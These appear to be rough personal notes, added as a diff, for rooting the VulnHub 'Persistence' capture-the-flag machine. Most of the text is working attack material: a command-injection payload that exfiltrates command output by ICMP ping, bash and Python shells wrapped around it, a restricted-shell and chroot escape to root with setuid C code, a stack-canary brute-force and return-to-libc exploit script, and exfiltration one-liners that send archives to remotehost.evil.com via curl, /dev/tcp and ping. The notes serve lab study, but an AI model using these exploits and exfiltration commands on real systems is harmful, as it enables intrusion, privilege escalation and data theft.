@@ -1,0 +1,606 @@
+https://connect.ed-diamond.com/GNU-Linux-Magazine/GLMFHS-090/Scapy-le-couteau-suisse-Python-pour-le-reseau
+https://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/
+https://leonjza.github.io/blog/2014/09/18/from-persistence/
+
+https://swappage.github.io/images/2014-10-06/persistence.pdf
+http://devloop.users.sourceforge.net/index.php?article106/solution-du-ctf-persistence
+https://g0blin.co.uk/persistence-vulnhub-writeup/#what-a-beautiful-shell
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
+
+https://beta.hackndo.com/technique-du-canari-bypass/
+https://filippo.io/escaping-a-chroot-jail-slash-1/
+http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html
+
+```console
+└─$ nikto -h http://192.168.110.38
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.110.38
++ Target Hostname:    192.168.110.38
++ Target Port:        80
++ Start Time:         2021-07-22 18:42:11 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.4.7
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.3.3
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /debug.php: Possible debug directory/program found.
++ 7921 requests: 6 error(s) and 5 item(s) reported on remote host
++ End Time:           2021-07-22 18:42:35 (GMT2) (24 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+```bash
+sudo tcpdump host 192.168.110.38 -i vboxnet0 and icmp
+```
+
+```console
+sudo tcpdump host 192.168.110.38 -i vboxnet0 and icmp -X
+```
+
+
+```console
+localhost; echo "test" > /tmp/test; if [ $? -eq 0 ]; then ping -c 1 192.168.110.1; fi
+;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.110.1; done
+;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.110.1; done
+```
+
+
+
+
+```bash
+#!/bin/bash
+
+HOST=192.168.110.38
+SHELL=debug.php
+printf "$ "
+while read cmd
+do
+    if [[ "$cmd" == "exit" ]]; then
+        break
+    fi
+    curl -s --data-urlencode "addr=;$cmd| xxd -p -c 16 | while read line; do ping -p \$line -c 1 -q 192.168.110.1; done" http://$HOST/$SHELL | sed '1,$d'
+    printf "$ "
+done < "/proc/${$}/fd/0"
+
+```
+```python
+#!/usr/bin/python3
+from requests import post
+import sys
+
+url='http://192.168.110.38/debug.php'
+attacker = '192.168.110.1'
+
+while True:
+    try:
+        sys.stdout.write('# ')
+        command = sys.stdin.readline().strip()
+        if (command == "exit"):
+            break
+        payload = "; {} | xxd -p -c 16 | while read line; do ping -c 1 -p $line {}; done".format(command,attacker)
+        r = post(url, data={"addr":payload})
+    except KeyboardInterrupt:
+        break
+```
+
+
+
+```console
+ssh avida@192.168.110.38 # dollars
+```
+==escape jail
+
+```console
+  nano -s /bin/bash
+  /bin/bash
+  ^T
+
+  ftp
+  !
+  /bin/bash
+
+  bash-4.1$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/avida/usr/bin
+  bash-4.1$ export SHELL=/bin/bash
+
+
+```
+
+
+==escallation root
+
+
+```bash
+bash-4.1$ ldd /usr/sbin/chroot
+        linux-gate.so.1 =>  (0xb7fff000)
+        libc.so.6 => /lib/libc.so.6 (0xb7e62000)
+        /lib/ld-linux.so.2 (0x00110000)
+
+bash-4.1$ cd /tmp
+bash-4.1$ mkdir /tmp/chroot
+bash-4.1$ mkdir -p $(python -c "print 'a/'*100")
+bash-4.1$ cd $(python -c "print 'a/'*100")
+bash-4.1$ mkdir bin
+bash-4.1$ cp -a /bin/bash bin/bash
+bash-4.1$ cp -a /bin/sh bin/sh
+bash-4.1$ cp -al /lib lib
+bash-4.1$ cp /tmp/chroot
+```
+
+```c
+
+//cat launcher.c 
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+}
+
+```
+
+```bash
+bash-4.1$ gcc launcher.c  -o bin/launcher
+```
+
+```c
+//cat sed.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/unistd.h>
+
+int main() {
+        setuid(0);
+        setgid(0);
+        chown("/bin/launcher", 0, 0);
+        chmod("/bin/launcher", S_ISUID|S_IRWXU|S_IRWXG|S_IRWXO);
+}
+```
+
+```console
+bash-4.1$ gcc sed.c  -o bin/sed
+bash-4.1$ cd $(python -c "print 'a/'*100")
+```
+```console
+bash-4.1$ ls -al /tmp/chroot/bin/launcher 
+-rwxrwxr-x. 1 avida avida 4864 Jul 23 11:17 /tmp/chroot/bin/launcher
+```
+```console
+bash-4.1$ /nginx/usr/share/nginx/html/sysadmin-tool --activate-service
+bash-4.1$ ls -al /tmp/chroot/bin/launcher 
+-rwsrwxrwx. 1 root root 4864 Jul 23 11:17 /tmp/chroot/bin/launcher
+```
+```console
+bash-4.1$ /tmp/chroot/bin/launcher
+bash-4.1# id
+uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+
+
+
+
+===worp
+
+```console
+└─$ ssh -L 3333:127.0.0.1:3333 avida@192.168.110.38
+```
+
+```python
+import socket
+import time
+import struct
+
+def p(x):
+  return struct.pack('<L', x)
+
+
+target = "127.0.0.1"
+port = 3333
+junk = "A"*30
+canary = ""
+for byte in xrange(4):
+  for canary_byte in xrange(256):
+    hex_byte = chr(canary_byte)
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.settimeout(10)
+    client.connect((target, port))
+    # [+] hello, my name is sploitable
+    reponse = client.recv(33)
+    # print (reponse.decode())
+    # [+] would you like to play a game?
+    reponse = client.recv(35)
+    # print (reponse.decode())
+    # >
+    reponse = client.recv(1)
+    # print (reponse.decode())
+
+    client.send(junk+canary+hex_byte)
+
+    # [+] yeah, I don't think so
+    time.sleep(0.1)
+    reponse = client.recv(27)
+    # print (reponse.decode())
+    # [+] bye!
+    reponse = client.recv(9)
+    if (b"bye!" in reponse):
+      canary += hex_byte
+      print (str(canary_byte) + " " + hex(canary_byte))
+      client.close()
+      break
+    client.close()
+
+rop = p(0xdeadbeef) #EBP
+rop += p(0x16c210)  # system
+rop += p(0x15f070)  # exit
+rop += p(0x8048c60) # /tmp/log
+
+payload = junk + canary + rop
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.settimeout(10)
+client.connect((target, port))
+# [+] hello, my name is sploitable
+reponse = client.recv(33)
+# print (reponse.decode())
+# [+] would you like to play a game?
+reponse = client.recv(35)
+# print (reponse.decode())
+# >
+reponse = client.recv(1)
+# print (reponse.decode())
+
+client.send(payload)
+
+# [+] yeah, I don't think so
+time.sleep(0.1)
+reponse = client.recv(27)
+# print (reponse.decode())
+# [+] bye!
+reponse = client.recv(9)
+client.close()
+
+
+bash-4.1$ cat launcher.c
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+}
+
+```
+
+```console
+bash-4.1$ gcc launcher.c -o launcher
+
+bash-4.1$ cat log 
+chown root.root /tmp/launcher
+chmod 4755 /tmp/launcher
+bash-4.1$ chmod  +x log
+```
+
+```console
+
+└─$ python2 exploit-worp.py
+```
+```console
+bash-4.1$ ls -al /tmp/launcher
+-rwsr-xr-x. 1 root root 4864 Jul 23 11:45 /tmp/launcher
+bash-4.1$ /tmp/launcher 
+bash-4.1# id
+uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+
+```bash
+# cat /etc/sysconfig/iptables
+*filter
+:INPUT DROP [0:0]
+:FORWARD DROP [0:0]
+:OUTPUT DROP [0:0]
+-A INPUT -p icmp -j ACCEPT
+-A OUTPUT -p icmp -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A OUTPUT -o lo -j ACCEPT
+
+-A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 22 -j ACCEPT
+-A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 22 -j ACCEPT
+
+-A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 80 -j ACCEPT
+-A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 80 -j ACCEPT
+COMMIT
+```
+```c
+//
+// This file was generated by the Retargetable Decompiler
+// Website: https://retdec.com
+// Copyright (c) Retargetable Decompiler <info@retdec.com>
+// sysadmin-tool.c
+
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+// ------------------------ Functions -------------------------
+
+// Address range: 0x8048514 - 0x8048615
+int main(int argc, char ** argv) {
+    if (argc != 2) {
+        // 0x8048523
+        puts("Usage: sysadmin-tool --activate-service");
+        // 0x8048613
+        return 0;
+    }
+    int32_t str = *(int32_t *)((int32_t)argv + 4); // 0x804853f
+    if (strncmp((char *)str, "--activate-service", 18) != 0) {
+        // 0x804855d
+        puts("Usage: sysadmin-tool --activate-service");
+        // 0x8048613
+        return 0;
+    }
+    // 0x8048573
+    setreuid(0, 0);
+    mkdir("breakout", 448);
+    chroot("breakout");
+    for (int32_t i = 0; i < 100; i++) {
+        // 0x80485b1
+        chdir("..");
+    }
+    // 0x80485c9
+    chroot(".");
+    system("/bin/sed -i 's/^#//' /etc/sysconfig/iptables");
+    system("/sbin/iptables-restore < /etc/sysconfig/iptables");
+    puts("Service started...");
+    puts("Use avida:dollars to access.");
+    // 0x8048613
+    return rmdir("/nginx/usr/share/nginx/html/breakout");
+}
+
+// --------------- Dynamically Linked Functions ---------------
+
+// int chdir(const char * path);
+// int chroot(const char * path);
+// int mkdir(const char * path, __mode_t mode);
+// int puts(const char * s);
+// int rmdir(const char * path);
+// int setreuid(__uid_t ruid, __uid_t euid);
+// int strncmp(const char * s1, const char * s2, size_t n);
+// int system(const char * command);
+
+// --------------------- Meta-Information ---------------------
+
+// Detected compiler/packer: gcc (4.6.3)
+// Detected functions: 1
+```
+```c
+//
+// This file was generated by the Retargetable Decompiler
+// Website: https://retdec.com
+// Copyright (c) Retargetable Decompiler <info@retdec.com>
+// worp.c
+
+#include <errno.h>
+#include <netinet/in.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+// ------------------------ Structures ------------------------
+
+struct sockaddr {
+    int32_t e0;
+    char e1[14];
+};
+
+// ------------------- Function Prototypes --------------------
+
+int32_t get_reply(int32_t * a1, int32_t a2, int32_t fd);
+
+// --------------------- Global Variables ---------------------
+
+int32_t g1;
+
+// ------------------------ Functions -------------------------
+
+// Address range: 0x8048774 - 0x80487de
+int32_t get_reply(int32_t * a1, int32_t a2, int32_t fd) {
+    int32_t v1 = __readgsdword(20); // 0x804878c
+    int32_t v2; // bp-38, 0x8048774
+    memcpy(&v2, a1, a2);
+    write(fd, (int32_t *)"[+] yeah, I don't think so\n", 27);
+    int32_t result = 0; // 0x80487d5
+    if (v1 != __readgsdword(20)) {
+        // 0x80487d7
+        __stack_chk_fail();
+        result = &g1;
+    }
+    // 0x80487dc
+    return result;
+}
+
+// Address range: 0x80487de - 0x8048b41
+int main(int argc, char ** argv) {
+    // 0x80487de
+    __readgsdword(20);
+    int32_t option_value = 1; // bp-564, 0x804880d
+    int32_t addr_len = 16; // bp-568, 0x8048817
+    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x8048838
+    if (sock_fd < 0) {
+        // 0x804884c
+        perror("socket");
+        exit(*__errno_location());
+        // UNREACHABLE
+    }
+    // 0x8048867
+    if (setsockopt(sock_fd, SO_DEBUG, 2, &option_value, 4) < 0) {
+        // 0x804889b
+        perror("setsockopt");
+        exit(*__errno_location());
+        // UNREACHABLE
+    }
+    int16_t addr = 2; // bp-552, 0x80488b6
+    htons(3333);
+    int32_t v1; // bp-544, 0x80487de
+    memset(&v1, 0, 8);
+    if (bind(sock_fd, (struct sockaddr *)&addr, 16) < 0) {
+        // 0x8048921
+        perror("bind");
+        exit(*__errno_location());
+        // UNREACHABLE
+    }
+    // 0x804893c
+    puts("[+] bind complete");
+    if (listen(sock_fd, 20) < 0) {
+        // 0x8048962
+        perror("listen");
+        exit(*__errno_location());
+        // UNREACHABLE
+    }
+    // 0x804897d
+    setenv("TMPLOG", "/tmp/log", 1);
+    puts("[+] waiting for connections");
+    puts("[+] logging queries to $TMPLOG");
+    int32_t addr2; // bp-536, 0x80487de
+    int32_t accepted_sock_fd = accept(sock_fd, (struct sockaddr *)&addr2, &addr_len); // 0x80489ce
+    if (accepted_sock_fd < 0) {
+        // 0x80489e2
+        perror("accept");
+        exit(*__errno_location());
+        // UNREACHABLE
+    }
+    int32_t fd = accepted_sock_fd;
+    puts("[+] got a connection");
+    while (fork() != 0) {
+        // 0x8048b0e
+        close(fd);
+        int32_t v2 = waitpid(-1, NULL, WNOHANG); // 0x8048b33
+        while (v2 >= 0 == (v2 != 0)) {
+            // 0x8048b1c
+            v2 = waitpid(-1, NULL, WNOHANG);
+        }
+        int32_t accepted_sock_fd2 = accept(sock_fd, (struct sockaddr *)&addr2, &addr_len); // 0x80489ce
+        if (accepted_sock_fd2 < 0) {
+            // 0x80489e2
+            perror("accept");
+            exit(*__errno_location());
+            // UNREACHABLE
+        }
+        fd = accepted_sock_fd2;
+        puts("[+] got a connection");
+    }
+    // 0x8048a16
+    write(fd, (int32_t *)"[+] hello, my name is sploitable\n", 33);
+    write(fd, (int32_t *)"[+] would you like to play a game?\n", 35);
+    write(fd, (int32_t *)"> ", 2);
+    int32_t buf; // bp-520, 0x80487de
+    memset(&buf, 0, 512);
+    int32_t v3 = read(fd, &buf, 512); // 0x8048aa9
+    get_reply(&buf, v3, fd);
+    write(fd, (int32_t *)"[+] bye!\n", 9);
+    close(fd);
+    exit(0);
+    // UNREACHABLE
+}
+
+// --------------- Dynamically Linked Functions ---------------
+
+// int * __errno_location(void);
+// void __stack_chk_fail(void);
+// int accept(int fd, __SOCKADDR_ARG addr, socklen_t * restrict addr_len);
+// int bind(int fd, __CONST_SOCKADDR_ARG addr, socklen_t len);
+// int close(int fd);
+// void exit(int status);
+// __pid_t fork(void);
+// uint16_t htons(uint16_t hostshort);
+// int listen(int fd, int n);
+// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
+// void * memset(void * s, int c, size_t n);
+// void perror(const char * s);
+// int puts(const char * s);
+// ssize_t read(int fd, void * buf, size_t nbytes);
+// int setenv(const char * name, const char * value, int replace);
+// int setsockopt(int fd, int level, int optname, const void * optval, socklen_t optlen);
+// int socket(int domain, int type, int protocol);
+// __pid_t waitpid(__pid_t pid, int * stat_loc, int options);
+// ssize_t write(int fd, const void * buf, size_t n);
+
+// --------------------- Meta-Information ---------------------
+
+// Detected compiler/packer: gcc (4.6.3)
+// Detected functions: 2
+
+```
+
+
+
+==todo 
+icmp-tunnel
+scappy
+
+
+
+>>> sniff(filter="icmp[icmptype] == 8 and host 192.168.56.104", prn=lambda x: x.load)
+ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
+ؤT
+   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
+ؤT�(nginx)
+oups=498(nginx)
+oups=498(nginx)
+oups=498
+
+
+
+
+tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
+rsync -aH localhost remotehost.evil.com:/some/path/name
+tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php
+
+tar zcf - localfolder >/dev/tcp/remotehost.evil.com/443
+tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443
+tar zcf - localfolder | base 64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/443
+
+using DNS queries to exfiltrate data:
+
+tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done
+
+
+
+└─$ cat recieve-icmp.py
+
+```py
+import socket
+import sys
+
+def recv():
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    while True:
+        data, src = s.recvfrom(1508)
+        payload = data[44:60]
+        sys.stdout.write(payload.decode('utf-8'))
+
+if __name__ == '__main__':
+    recv()
+
+```
+
+```bash
+# sender
+cat test.py | xxd -p -c 16 | while read line; do echo $line; ping -p $line -c 1 -q 127.0.0.1; done
+# https://gist.github.com/mvetsch/869b5e04caa530f7b760a36dee1a2d23
+split -b 16 test.py ; for f in `ls x*`; do  ping -c 1 -p `xxd -ps $f ` 127.0.0.1 ;sleep 1;  done
+
+```
